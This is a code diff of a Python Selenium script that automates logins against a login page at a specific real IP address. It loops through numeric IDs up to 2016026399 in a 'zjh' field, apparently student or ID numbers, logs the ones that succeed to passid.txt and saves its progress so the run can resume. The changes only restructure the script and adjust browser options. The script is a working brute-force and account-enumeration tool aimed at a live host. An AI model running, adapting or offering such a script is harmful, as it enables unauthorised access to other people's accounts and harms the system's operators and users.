@@ -2,16 +2,15 @@
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 
-
-def spider():
-    chrome_options = Options()
-    chrome_options.add_argument('--headless')
-    chrome_options.add_argument('--disable-gpu')  # 上面三行代码就是为了将Chrome不弹出界面，实现无界面爬取
-    browser = webdriver.Chrome(chrome_options=chrome_options)
-    browser.get('http://60.219.165.24')
-    lastid = open('lastid.txt', 'r+')
-    passid = open('passid.txt', 'a+')
-    try:
+chrome_options = Options()
+chrome_options.add_argument('--headless')
+chrome_options.add_argument('--no-sandbox')
+chrome_options.add_argument('--disable-gpu')  # 上面三行代码就是为了将Chrome不弹出界面，实现无界面爬取
+browser = webdriver.Chrome(options=chrome_options)
+browser.get('http://60.219.165.24')
+lastid = open('lastid.txt', 'r+')
+passid = open('passid.txt', 'a+')
+try:
         for i in range(int(lastid.read()[-10:]), 2016026399):
             username = browser.find_element_by_name('zjh')
             username.send_keys(i)
@@ -29,7 +28,7 @@ def spider():
                 print(i)
                 lastid.write(str(i))
                 passid.write(str(i) + '\n')
-    finally:
+finally:
         browser.close()
         ld = lastid.read()[-10:]
         lastid1 = open('lastid.txt', 'w')
@@ -37,5 +36,3 @@ def spider():
         lastid.close()
         lastid1.close()
         passid.close()
-
-spider()
